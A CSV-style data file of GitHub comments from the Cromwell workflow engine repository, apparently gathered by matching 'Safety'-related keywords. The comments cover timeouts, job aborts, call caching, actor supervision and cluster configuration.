Safety,"Oh right, I forgot about this comment... sorry :sweat_smile: The issue turned out to be with the call-caching strategy we were using. Because there were a lot of files being created, cromwell needed to do a large amount of hashing, which used up all of the available CPUs eventually leading to the timeouts. We changed the call-caching strategy and are no now longer running into this error.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-432255713:298,timeout,timeouts,298,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4057#issuecomment-432255713,1,['timeout'],['timeouts']
Safety,"Okay, I'm having a little bit of trouble keeping track of what JARs are allowed to included where... but I'll avoid hijacking this PR to talk about that.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-209591621:110,avoid,avoid,110,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/688#issuecomment-209591621,1,['avoid'],['avoid']
Safety,"One case for caching the results for a few seconds would be the possibility of just missing the results due to requester timeout, and then when the retry happens having to recalculate the entire thing again. ---. Alternatively (getting into alternative metadata schemes) we do *permanent* caching - ie replacing all those simpletons with the pre-processed metadata response for completed workflows (maybe triggered by a metadata request for the workflow), so that we don't need to continually rebuild them even months after a workflow completes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4226#issuecomment-429104968:121,timeout,timeout,121,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4226#issuecomment-429104968,2,['timeout'],['timeout']
Safety,"Overall I'm liking the `Validation` angle to these changes, this seems like a nice system which could be used in other spots in Cromwell. I think the attribute parsing could be made more tolerant so that Kristian's examples of `8G` and `8GB` actually would parse, but that's orthogonal to getting helpful error messages when something is unparseable. I'm happy to address more tolerant parsing in a separate PR. Also, it feels like the case classes might have been overused in these changes; they aren't replacing type aliases but are wrapping what used to be raw types. This does buy some added type safety in . ``` scala; (failOnStderr |@| cpu |@| preemptible |@| disks |@| memory){ RuntimeAttributes(docker, zones, _, _, _, _, _) }; ```. But then everywhere else there's noise for boxing and unboxing the raw types to and from these case classes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/163#issuecomment-135972385:601,safe,safety,601,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/163#issuecomment-135972385,1,['safe'],['safety']
Safety,"PR redo. This on moves the docs to google and increses sbt jvm stack size to avoid ""(cwl / Compile / compileIncremental) java.lang.StackOverflowError"".",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3720#issuecomment-394412402:77,avoid,avoid,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3720#issuecomment-394412402,1,['avoid'],['avoid']
Safety,"Per Khalid's comments above we may want a new ticket to address the inconsistency in the WA / WEA supervision strategy wrt parent / child interactions: when the WEA died the the WA's supervision strategy said `Stop` (do not restart the crashed WEA), but then the WA sent the defunct WEA an abort message. The WA then parked itself in `WorkflowAbortingState` and waited for a `WorkflowExecutionAbortedResponse` that would never be sent from a WEA that no longer existed. . While the changes in this PR prevent the WEA from crashing in this specific (and alarmingly ordinary) circumstance (hooray!), I agree there are still general structural issues in the WA / WEA relationship we should address separately.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5595#issuecomment-665755219:290,abort,abort,290,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5595#issuecomment-665755219,1,['abort'],['abort']
Safety,"Per standup this morning we've decided to close this. The requested functionality is problematic on a few levels:. JSON runtime attributes are currently interpreted as WdlExpressions after going through coercion, which presently is a backend-dependent process as only the backend knows the accepted runtime attribute coercions. While currently it might appear safe to treat the default runtime attribute JSON values as WDL with a `WdlExpression.fromString`, that's an assumption of WDL / JSON expression equivalence not made elsewhere in Cromwell and it seems questionable to pioneer that here. Currently Cromwell's backend assignments happen at initialization time, but in the future Cromwell's backend dispatch is likely to become more sophisticated and dynamic. It therefore wouldn't be possible to say at workflow initialization time the backend to which a call was fated, which would mean the default runtime attribute handling would need to happen in the various `FooRuntimeAttributes` classes as it does now. The refactor proposed here would actually remove the default runtime attribute handling at call execution time and therefore make dynamic dispatch more difficult to add in the future. Finally, while it appears technically possible to doctor tasks with workflow option-derived default runtime attributes in `MaterializeWorkflowDescriptorActor`, this makes for some pretty hacky code. I discovered at least 3 spots that needed to be updated:; - backendAssignment values; - NamespaceWithWorkflow -> tasks; - NamespaceWithWorkflow -> workflow -> children -> tasks. That last item was particularly hideous since `Workflow#children` is explicitly write-once. I got around this with subclassing, but I felt bad about myself afterward.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-238635247:360,safe,safe,360,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1076#issuecomment-238635247,1,['safe'],['safe']
Safety,Please don't comment any more here. Will re-open against Job Avoidance branch with changes made.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/276#issuecomment-154528182:61,Avoid,Avoidance,61,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/276#issuecomment-154528182,1,['Avoid'],['Avoidance']
Safety,"Post rebase, please:; - change `/workflow` to `/workflows`; - add the `version` to the making it `/workflows/:version/:id/abort`; - add the response annotation to the `200` response; - double check that you can create and send an abort request via the ui (`sbt 'run server'`, then visit [/swagger](http://localhost:8000/swagger)). With the edits above this PR looks good to go for me. Besides that, the un-DRYness of swagger and akka continue to make my skin crawl, but I don't know any better best practices.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/114#issuecomment-125854264:122,abort,abort,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/114#issuecomment-125854264,2,['abort'],['abort']
Safety,"Probably. On Wed, Apr 5, 2017 at 10:56 AM Kate Voss <notifications@github.com> wrote:. > @dvoet <https://github.com/dvoet> I'm going through the backlog and I was; > wondering if you're still seeing this problem. Aborts are a known issue for; > Cromwell but I wasn't sure if a newer version of Cromwell happened to do; > this better. If so, I'll close this out, if not I'll keep it around for; > when we fix aborts.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1885#issuecomment-291888077>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ABc2tSUYfndPSfSEpNFx6Aq72x98Src7ks5rs6uVgaJpZM4Lpr-l>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1885#issuecomment-291919797:213,Abort,Aborts,213,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1885#issuecomment-291919797,2,"['Abort', 'abort']","['Aborts', 'aborts']"
Safety,"Re: `WorkflowManagerActorSpec`, over in my current PR I bumped up the event message timeouts, since it seemed to be taking more than 3 seconds for `ScatterWdl` to finish running.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/268#issuecomment-153539194:84,timeout,timeouts,84,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/268#issuecomment-153539194,1,['timeout'],['timeouts']
Safety,"Re: redundant test code, everything is separate as far as I can tell, including looking at the coverage counts in coveralls. The various tests I see are:. Existing in cromwell pre-PR:; - Test the cromwell swagger _JSON_ is valid according to the swagger specification; - Test that the cromwell swagger route serves up the json to the expected URL. Now as of this PR:. - Test that common code for serving up a swagger endpoint can serve; - json or yaml swagger; - [CORS](https://en.wikipedia.org/wiki/Cross-origin_resource_sharing) support; - Utility for redirecting browser requests to `/` to the correct swagger UI. Also included in this PR:; - Ensure that ""wrapping"" a route works, serving all wrapped routes under a new prefix like `/api/*`; - Ensure that common code for easier spray-can binding works",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2093#issuecomment-289486065:4,redund,redundant,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2093#issuecomment-289486065,1,['redund'],['redundant']
Safety,Redundant. we're already on 4.10.4,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5752#issuecomment-729792679:0,Redund,Redundant,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5752#issuecomment-729792679,1,['Redund'],['Redundant']
Safety,"Regarding aborts, @Horneth made significant changes to aborts in Cromwell 30 (coming soon!) that should make it easier and more reliable to abort jobs.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-344392351:10,abort,aborts,10,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2845#issuecomment-344392351,3,['abort'],"['abort', 'aborts']"
Safety,"Regarding the supervision/exceptions-- for better or worse, our akka Actors are still using a lot of scala Futures. In the case of the call to `copyCachedOutputs`, the entire method call is wrapped in a `Future.apply()` via `BackendCacheHitCopyingActor.receive`:. ``` scala; def receive: Receive = LoggingReceive {; case CopyOutputsCommand(simpletons, jobDetritus, returnCode) =>; performActionThenRespond(Future(copyCachedOutputs(simpletons, jobDetritus, returnCode)), onFailure = cachingFailed, andThen = context stop self); case AbortJobCommand =>; abort(); context.parent ! AbortedResponse(jobDescriptor.key); context stop self; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1439#issuecomment-248343848:532,Abort,AbortJobCommand,532,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1439#issuecomment-248343848,4,"['Abort', 'abort']","['AbortJobCommand', 'AbortedResponse', 'abort']"
Safety,Requesting re-review because this now includes a less-likely-to-be-made-redundant unit test,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5993#issuecomment-719024604:72,redund,redundant,72,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5993#issuecomment-719024604,1,['redund'],['redundant']
Safety,ResponseStage.handleResponse(HandleResponseStage.java:73); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:58); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.HandleResponseStage.execute(HandleResponseStage.java:41); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:63); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallAttemptTimeoutTrackingStage.execute(ApiCallAttemptTimeoutTrackingStage.java:36); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:77); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.TimeoutExceptionHandlingStage.execute(TimeoutExceptionHandlingStage.java:39); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.doExecute(RetryableStage.java:115); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage$RetryExecutor.execute(RetryableStage.java:88); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:64); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.RetryableStage.execute(RetryableStage.java:44); 	at software.amazon.awssdk.core.internal.http.pipeline.RequestPipelineBuilder$ComposingRequestPipelineStage.execute(RequestPipelineBuilder.java:205); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:51); 	at software.amazon.awssdk.core.internal.http.StreamManagingStage.execute(StreamManagingStage.java:33); 	at software.amazon.awssdk.core.internal.http.pipeline.stages.ApiCallTimeoutTrackingStage.executeWithTimer(ApiCallTimeoutTrackingStage.java:79,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119:1557,Timeout,TimeoutExceptionHandlingStage,1557,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5162#issuecomment-540113119,2,['Timeout'],['TimeoutExceptionHandlingStage']
Safety,"Reviewer wheel hasn't been rolled-- but IMHO the tag name is overly specific. I'd say perhaps even just use the `PostMVP` tag or `ignore` with a TODO as to what's going on, until we come up with a fix for our supervision model / retries for initializing the database. `MainSpec`'s timeouts happen more frequently, but in my repeated tests the corpse services _seemed_ to be killing [other tests too](https://s3.amazonaws.com/archive.travis-ci.org/jobs/143093948/log.txt) in Travis:; - `SingleToArrayCoercionSpec`; - `EmptyOutputSpec`; - `InputLocalizationWorkflowSpec`; - `LocalBackendSpec`; - `BadTaskOutputWorkflowSpec`; - `ReadTsvWorkflowSpec`; - `GlobbingWorkflowSpec`; - `MultiLineCommandWorkflowSpec`; - `FileSizeWorkflowSpec`; - `WriteTsvSpec`; - `WriteLinesSpec`; - `CromwellApiServiceSpec`; - … plus (at least) one spec that seems to be zombieing the entire test suite such that it times out",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1145#issuecomment-231899875:281,timeout,timeouts,281,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1145#issuecomment-231899875,1,['timeout'],['timeouts']
Safety,"Right, I should have mentioned that my WDL pipeline failed. I received errors such as the following:; ```; ...; {; ""causedBy"": [; {; ""causedBy"": [; {; ""message"": ""504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media"",; ""causedBy"": []; }; ],; ""message"": ""Could not read from gs://mccarroll-mocha/cromwell/cromwell-executions/mocha/86d47e9a-5745-4ec0-b4eb-0164f073e5f4/call-idat2gtc/shard-73/rc: 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media""; }; ],; ""message"": ""[Attempted 1 time(s)] - IOException: Could not read from gs://mccarroll-mocha/cromwell/cromwell-executions/mocha/86d47e9a-5745-4ec0-b4eb-0164f073e5f4/call-idat2gtc/shard-73/rc: 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media""; }; ],; ""message"": ""Workflow failed""; ```; And the pipeline did not proceed (even if all tasks run until that point seemed to be reported as completed successfully).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760312719:175,Timeout,Timeout,175,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5344#issuecomment-760312719,3,['Timeout'],['Timeout']
Safety,"Right. When these issues come up they're part of a tension between people using docker and people using HPC on shared filesystems (who almost always are **not** using docker). . What we've done in the past has been to detect if the context is docker - if so, stick with something more permissive and if not lock it down. YMMV and all of that",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394394286:218,detect,detect,218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/3721#issuecomment-394394286,1,['detect'],['detect']
Safety,"Running the workflow; ```; version 1.0. workflow test {; input {; Array[File]? y = [""some/file/path.txt""]; }. output {; Array[File] x = select_first([y, []]); }; }; ```; on latest `develop` seems to work fine, producing outputs; ```; {; ""test.x"": [""some/file/path.txt""]; }; ```. Is this an accurate simplification of your problem case?. There is a good chance this bug is fixed in 37 onward as a result of https://github.com/broadinstitute/cromwell/pull/4324; >Fixed a regression in Cromwell 36 that could cause operations on empty arrays to fail with a spurious type error. I suspect your workflow got stuck after failing because the `WomArray` code [throws an exception](https://github.com/broadinstitute/cromwell/blob/develop/wom/src/main/scala/wom/values/WomArray.scala#L37) that screws up control flow. I believe this is a ""this should never happen"" case so we did not bother upgrading it to our fancier error handling that encodes failures in the type system to achieve predictable behavior.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4755#issuecomment-474440247:976,predict,predictable,976,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4755#issuecomment-474440247,2,['predict'],['predictable']
Safety,Safe to merge - the only centaur fails are due to changed message syntax in centaur and unrelated to this change.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1616#issuecomment-256419183:0,Safe,Safe,0,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1616#issuecomment-256419183,1,['Safe'],['Safe']
Safety,"Sample of a possible new log message thread:; ```; [INFO] [...] [.../TestJesApiQueryManager-1262117937] Running with 1 PAPI request workers; [WARN] [...] [.../TestJesApiQueryManager-1262117937] PAPI request worker statusPoller1 terminated. 0 run creation requests, 5 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice. Exception details: cromwell.backend.google.pipelines.common.api.PipelinesApiRequestManager$$anonfun$1$$anon$1: PipelinesApiRequestHandler actor termination caught by manager; [INFO] [...] [.../TestJesApiQueryManager-1262117937] PAPI request worker statusPoller1 has been removed and replaced by statusPoller2 in the pool of 1 workers; [WARN] [...] [.../TestJesApiQueryManager-1262117937] PAPI request worker statusPoller2 terminated. 0 run creation requests, 5 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice. Exception details: cromwell.backend.google.pipelines.common.api.PipelinesApiRequestManager$$anonfun$1$$anon$1: PipelinesApiRequestHandler actor termination caught by manager; [INFO] [...] [.../TestJesApiQueryManager-1262117937] PAPI request worker statusPoller2 has been removed and replaced by statusPoller3 in the pool of 1 workers. ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4671#issuecomment-479685147:295,abort,abort,295,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4671#issuecomment-479685147,2,['abort'],['abort']
Safety,"Should we also change the terminology from ""job avoidance"" to call caching?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/285#issuecomment-155520280:48,avoid,avoidance,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/285#issuecomment-155520280,1,['avoid'],['avoidance']
Safety,"Side note for those **only** looking to put time limits on commands, and **not** looking for a workaround for cloud bugs-- here's a more-portable time limit option: `timeout`. `timeout` differs slightly in each distro. Example docs:; - https://busybox.net/downloads/BusyBox.html#timeout; - https://www.gnu.org/software/coreutils/manual/html_node/timeout-invocation.html; - https://manpages.debian.org/stretch/coreutils/timeout.1.en.html. The command `timeout` will most likely be unable to help for ""stuck"" cloud jobs. For example, if the command `echo hello world` actually exits but for some unknown reason the cloud VM sticks around forever, then `timeout 5s echo hello world` will likely have the same issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4946#issuecomment-490059717:166,timeout,timeout,166,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4946#issuecomment-490059717,7,['timeout'],"['timeout', 'timeout-invocation']"
Safety,"Similar to other parser-related errors reported by Andrea in WB, [via google](https://www.google.com/search?q=owlapi+thread+safety) I'm not convinced the OWL API is thread safe. Some info/debug logging might expose if multiple threads are trying to access the OWL API, and synchronization might fix it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4372#issuecomment-437411171:124,safe,safety,124,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4372#issuecomment-437411171,2,['safe'],"['safe', 'safety']"
Safety,Similarly I passed in `wdlInputs` instead of `workflowInputs` and got a giant stack trace on the cromwell side but no response (other than timeout) on the client side,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1740#issuecomment-264953339:139,timeout,timeout,139,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1740#issuecomment-264953339,1,['timeout'],['timeout']
Safety,"Since you specifically asked for a ""words"" review, I personally found the CHANGELOG comment came across as a bit defensive (and IMO slightly overplays the certainty of one new heuristic). My suggestion:. > Added a new heuristic for detecting preemption jobs in PAPIv2 based on the error message ""The assigned worker has failed to complete the operation"". Jobs with this message will from now on be treated as preempted rather than failed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5072#issuecomment-511349623:232,detect,detecting,232,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5072#issuecomment-511349623,1,['detect'],['detecting']
Safety,"So I did some digging. The bad news: a `docker_pull` command will not work. It cannot be implemented at workflow initialization because at that point in time runtime attributes are not known. These are evaluated when the task is executed. This is due to inputs in WDL being dependent on the outputs of other tasks, which is what makes WDL great, so this cannot (easily) be fixed. So a docker_pull command would have to be executed at task execution time. But then it is redundant. This command can be part of the submit script. . Thanks @TMiguelT for suggesting flock. Together with `singularity exec` I think it can solve this particular use case. The `SINGULARITY_CACHEDIR` environment variable needs to be set to a location on the cluster. Then the following config can work:. ```; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 200; exit-code-timeout-seconds = 120; # 4G Memory by default; runtime-attributes= """"""; Int cpu = 1; Int? memory; String? docker; Int time_minutes = 120; """"""; submit-docker = """"""; # Singularity pull image. ; if [ -z $SINGULARITY_CACHEDIR ]; ; then CACHE_DIR=$HOME/singularity/cache; else CACHE_DIR=$SINGULARITY_CACHEDIR; fi; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/singularity_pull_flock; # flock should work as this is executed at the same node as cromwell.; flock --verbose --exclusive --timeout 900 $LOCK_FILE singularity exec --containall docker://${docker} echo ""succesfully pulled ${docker}!"". # Partition selection; PARTITION=all; MEMORY=${default=""4294967296"" memory}; if [ ${time_minutes} -lt 60 ]; then PARTITION=short; fi; if [ $MEMORY -gt 107374182400 ] ; then PARTITION=highmem ; fi. # Job submission; sbatch \; --partition=$PARTITION \; --job-name=""${job_name}"" \; --chdir=""${cwd}"" \; --time=""${time_minutes}"" \; --cpus-per-task=""${cpu}"" \; --mem=$(echo ""$MEMORY / 1024^2"" | bc) \; --output=""${out}"" \; --error=""${err}"" \; --wrap \; 'singularity exec --containall --bind /",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430:470,redund,redundant,470,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430,2,"['redund', 'timeout']","['redundant', 'timeout-seconds']"
Safety,"So if you stand up several cromwells, how do you avoid them all trying to; do the summary stuff and clobber eachother? That's the purpose of this; ticket. All the readers would read the summary, but only one should be; writing it. ---. Kristian Cibulskis; Chief Architect, Data Sciences & Data Engineering; Broad Institute of MIT and Harvard; kcibul@broadinstitute.org. On Fri, Sep 9, 2016 at 11:37 AM, Thib notifications@github.com wrote:. > @geoffjentry https://github.com/geoffjentry I believe that is correct.; > Just to get some clarification on this - why does the summary refresh; > actor need to be disabled to use cromwell as read-only ? I understand that; > the refresh actor writes to the database, but in very low amounts (1 line; > per workflow), and its purpose (as I understand it, @mcovarr; > https://github.com/mcovarr ?) is to help relieve the metadata endpoint; > by avoiding recomputing the current status on every call, which would be; > useful for a read-only cromwell ?; > ; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245950069,; > or mute the thread; > https://github.com/notifications/unsubscribe-auth/ABW4g3Ta6a_kXzY1BGl8L_aAEr5duoTpks5qoX0hgaJpZM4J3efD; > .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245950671:49,avoid,avoid,49,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1378#issuecomment-245950671,2,['avoid'],"['avoid', 'avoiding']"
Safety,So successes are not wrapped - only failures are (which the ticket was about). With the exception of the validate endpoint which has a special response format which would have been weird not updating.; It's easy enough to wrap the success too - It just feels risky too me to update the entire API responses format a week before firecloud goes live but if that's fine I can wrap the successes too and let them now. We should tell them anyway that the error format will change.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/368#issuecomment-171069379:259,risk,risky,259,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/368#issuecomment-171069379,1,['risk'],['risky']
Safety,"So we need an uber api that tracks preemptions across registered Cromwell; servers and then uses machine learning to make predictions of lowest cost; configuration that meets system resources. Simple.... (joke). On Dec 18, 2016 12:39, ""Jeff Gentry"" <notifications@github.com> wrote:. > @pgrosu <https://github.com/pgrosu> IIRC we use central to avoid some of; > their other large customers in other zones. However note that we *are*; > one of their large customers so choosing the same zone as us might not be; > the best plan for success in avoiding preemptions :); >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267834836>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/AAFpE0Z7yysmspq1G1F35bUZzr4Cy7wzks5rJW_LgaJpZM4LPeJB>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267836259:122,predict,predictions,122,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1795#issuecomment-267836259,6,"['avoid', 'predict']","['avoid', 'avoiding', 'predictions']"
Safety,"So, setting `concurrent-job-limit` to 8 did resolve my issue (and I hit another, unrelated issue instead). However, I don't believe this is the ideal way to resolve this. I (and I assume most other users) want maximum concurrency with my jobs, we just want to avoid this error. If we caught this `Too Many Requests` error, and just waited for a few seconds before retrying these requests, it would surely resolve this issue in a cleaner way.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-435558323:260,avoid,avoid,260,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-435558323,1,['avoid'],['avoid']
Safety,"Sorry, that was one run. I have another one where ContinueWhilePossible was the default value and the; same issue happened. On Aug 4, 2017 12:50 PM, ""Thib"" <notifications@github.com> wrote:. > It's working as expected at least, Cromwell does not abort running jobs; > when a workflow fails. It just stops tracking them and fails the workflow; > without starting new jobs.; > ContinueWhilePossible makes Cromwell continue to start new jobs ""while; > possible"" even if some jobs have failed.; > In neither case does Cromwell abort running jobs when the workflow fails; > though.; >; > —; > You are receiving this because you authored the thread.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-320298013>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk9wqG1Sd-sxUhIChB1UaFrpU1rQZks5sU0urgaJpZM4Ot1MJ>; > .; >",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-320301060:246,abort,abort,246,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2517#issuecomment-320301060,2,['abort'],['abort']
Safety,Spoke to @mcovarr in-person. My take on the goal of this PR is to catch database errors related to aborts and either report them back to the sender or log them. :+1: . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/2154/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2154#issuecomment-293336655:99,abort,aborts,99,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2154#issuecomment-293336655,1,['abort'],['aborts']
Safety,"Spoke to Khalid, making a replacement ticket to avoid confusion.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/579#issuecomment-216572364:48,avoid,avoid,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/579#issuecomment-216572364,1,['avoid'],['avoid']
